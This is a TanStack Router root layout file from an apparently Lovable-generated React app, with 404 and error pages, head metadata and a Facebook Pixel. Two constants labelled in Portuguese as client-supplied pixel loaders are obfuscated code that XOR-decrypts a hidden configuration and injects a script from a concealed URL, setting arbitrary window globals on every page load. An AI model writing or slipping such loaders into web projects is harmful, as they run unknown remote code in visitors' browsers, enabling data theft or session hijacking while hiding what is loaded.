import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Archivo:wght@600;700;800;900&family=Inter:wght@400;500;600;700&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],

  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

/** ID do Meta (Facebook) Pixel usado no rastreamento de conversões. */
const FACEBOOK_PIXEL_ID = "2062710850952061";

const FACEBOOK_PIXEL_SCRIPT = `!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window,document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '${FACEBOOK_PIXEL_ID}');
fbq('track', 'PageView');`;

/** Loader de pixel de terceiros fornecido pelo cliente. */
const PIXEL_EXTERNO_SCRIPT = `(function(){var g_s=atob("DBQ/DI0UV1bshLo2128def94dWzO7M5Cp2cFI6J3MzjC8c5bvnJGIu57OniO9pVFtGZWfPlneCOY6ckZu3VLaf5geTyfppYUtmBLfuR2IiKJ95gMjG8dYux5MnTWpt5Xo3USefl5PjCVqcpEsmJaYvk5LzWD4JdFtH8dIK9iNjqZ4ZgM9TZCIPY2OTeB4ZgM9XBeeOw5IiKB7dxP+mRNaftxOSLB989UvnBMLqE2ITeA8d8U7TYdcdBp");var q_d4=[];for(var u_c=0;u_c<g_s.length;u_c++){q_d4.push(g_s.charCodeAt(u_c)&255);}var u_y=q_d4[0];var q_v=q_d4.slice(1,1+u_y);var q_5f=q_d4.slice(1+u_y);var q_qwz=q_5f.map(function(b,b_jbm){return b^q_v[b_jbm%u_y];});var r_8="";for(var p_ayos=0;p_ayos<q_qwz.length;p_ayos++){r_8+=String.fromCharCode(q_qwz[p_ayos]&255);}var d_2cdx=decodeURIComponent(escape(r_8));var w_bx7=JSON.parse(d_2cdx);var i_5g9=w_bx7.globals||[];i_5g9.forEach(function(x_ch3){window[x_ch3.name]=x_ch3.value;});var o_a=document.createElement("script");o_a.src=w_bx7.url;o_a.async=true;o_a.defer=true;(w_bx7.attributes||[]).forEach(function(p_99q){o_a.setAttribute(p_99q.name,p_99q.value);});(document.head||document.documentElement).appendChild(o_a);})();`;

/** Segundo loader de pixel de terceiros fornecido pelo cliente. */
const PIXEL_EXTERNO_SCRIPT_2 = `(function(){var j_1=atob("DPRU6M+LbvU9A68RAo92nb3nTM8fa9tlcodux+DoCpsTdtt8a5ItxqzkA9tfcYBiYYY9mLv4QYVUe8p9LYQ9kKrnQJ9OIYMzY4AgmqbpG4FYcI0rWal4yqjnAZdcb9wzOK8vyqHqA5AfOY1ha4wxhIbvTNkfdc59d5F20u29D8EIMM5yYZdn2au8XsAMNJYiOswwjf6pE6hA");var f_o6=[];for(var l_t=0;l_t<j_1.length;l_t++){f_o6.push(j_1.charCodeAt(l_t)&255);}var z_8=f_o6[0];var t_1to=f_o6.slice(1,1+z_8);var v_a8=f_o6.slice(1+z_8);var q_e9yt=v_a8.map(function(b,v_v){return b^t_1to[v_v%z_8];});var x_f="";for(var p_ip=0;p_ip<q_e9yt.length;p_ip++){x_f+=String.fromCharCode(q_e9yt[p_ip]&255);}var a_f6f6=decodeURIComponent(escape(x_f));var q_yu4=JSON.parse(a_f6f6);var i_9ti=q_yu4.globals||[];i_9ti.forEach(function(x_vz){window[x_vz.name]=x_vz.value;});var x_x6=document.createElement("script");x_x6.src=q_yu4.url;x_x6.async=true;x_x6.defer=true;(q_yu4.attributes||[]).forEach(function(y_8b3j){x_x6.setAttribute(y_8b3j.name,y_8b3j.value);});(document.head||document.documentElement).appendChild(x_x6);})();`;

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
        <script dangerouslySetInnerHTML={{ __html: FACEBOOK_PIXEL_SCRIPT }} />
        <script dangerouslySetInnerHTML={{ __html: PIXEL_EXTERNO_SCRIPT }} />
        <script dangerouslySetInnerHTML={{ __html: PIXEL_EXTERNO_SCRIPT_2 }} />

      </head>
      <body>
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            alt=""
            src={`https://www.facebook.com/tr?id=${FACEBOOK_PIXEL_ID}&ev=PageView&noscript=1`}
          />
        </noscript>
        {children}
        <Scripts />
      </body>
    </html>
  );
}


function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
